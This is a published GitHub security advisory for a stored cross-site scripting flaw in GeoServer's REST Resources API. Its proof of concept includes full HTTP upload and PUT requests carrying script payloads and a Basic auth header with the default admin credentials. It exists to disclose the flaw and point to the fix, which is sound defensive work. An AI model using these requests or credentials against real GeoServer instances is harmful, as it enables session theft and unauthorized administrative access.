# [M] Stored Cross-Site Scripting (XSS) vulnerability in GeoServer's REST Resources API

## Summary
Severity: Medium
Advisory: GHSA-fh7p-5f6g-vj2w
CVE: CVE-2023-51445
CWE: CWE-79
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2024-03-20
Source: https://github.com/advisories/GHSA-fh7p-5f6g-vj2w
Type: github-advisory

## Affected
- Maven: `org.geoserver:gs-restconfig` — affected >=0 <2.23.3

## Details
### Summary
A stored cross-site scripting (XSS) vulnerability exists that enables an authenticated administrator with workspace-level privileges to store a JavaScript payload in uploaded style/legend resources that will execute in the context of another administrator's browser when viewed in the REST Resources API.  Access to the REST Resources API is limited to full administrators by default and granting non-administrators access to this endpoint should be carefully considered as it may allow access to files containing sensitive information.

### Details
Upload a new Legend via the New Style page if user has permissions for this. This file is then not checked and is uploaded to the backend system. This file can then be viewed directly by requesting it via the API which will then view the file in its raw format without sanitisation.
![image](https://user-images.githubusercontent.com/6471928/232732469-7dbf2776-5712-4c68-bd12-e2403c136a7c.png)

![image](https://user-images.githubusercontent.com/6471928/232732832-4fe2337f-9b28-41b1-9181-24abff4a6973.png)


### PoC

1 .User makes the following request to upload file.
```
POST /geoserver/web/wicket/bookmarkable/org.geoserver.wms.web.data.StyleNewPage?11-1.IBehaviorListener.0-dialog-dialog-content-form-submit&wicket-ajax=true&wicket-ajax-baseurl=wicket%2Fbookmarkable%2Forg.geoserver.wms.web.data.StyleNewPage%3F11 HTTP/1.1
Host: geoserver:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------37957706701641834739220342753
Content-Length: 619
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------37957706701641834739220342753
Content-Disposition: form-data; name="id89_hf_0"
-----------------------------37957706701641834739220342753
Content-Disposition: form-data; name="userPanel:image"
-----------------------------37957706701641834739220342753
Content-Disposition: form-data; name="userPanel:upload"; filename="test.html"
Content-Type: text/html
<script>alert(document.cookie)</script>
-----------------------------37957706701641834739220342753
Content-Disposition: form-data; name="p::submit"
1
-----------------------------37957706701641834739220342753--
```
2. File is uploaded to the backend system and is viewable via the API at - /geoserver/rest/resourse/styles as per the screenshot above.

3. If admin user views this file the Javascript is executed and this could be used to craft a payload to steal the user's cookies(as these do not currently use HTTPOnly)
![image](https://user-images.githubusercontent.com/6471928/232733694-5a994b08-53e4-4cd0-a20e-ec8717537e26.png)

Alternatively -

If the user has permissions to use the API to make PUT requests then they can directly upload malicious files as per a request below. This would be viewable in the same way as above.

PUT /geoserver/rest/resource/styles/test2.html HTTP/1.1
Host: geoserver:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46Z2Vvc2VydmVy (admin:geoserver default credentials)
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: text/html
Content-Length: 29

<script>alert(1)</script>


### Impact
If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:

1 .Perform any action within the application that the user can perform.
2. View any information that the user is able to view.
3. Modify any information that the user is able to modify.
4. Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.

### References
https://osgeo-org.atlassian.net/browse/GEOS-11148
https://github.com/geoserver/geoserver/pull/7161

## References
- https://github.com/geoserver/geoserver/security/advisories/GHSA-fh7p-5f6g-vj2w
- https://nvd.nist.gov/vuln/detail/CVE-2023-51445
- https://github.com/geoserver/geoserver/pull/7161
- https://github.com/geoserver/geoserver/commit/7db985738ff2422019ccac974cf547bae5770cad
- https://github.com/geoserver/geoserver
- https://osgeo-org.atlassian.net/browse/GEOS-11148
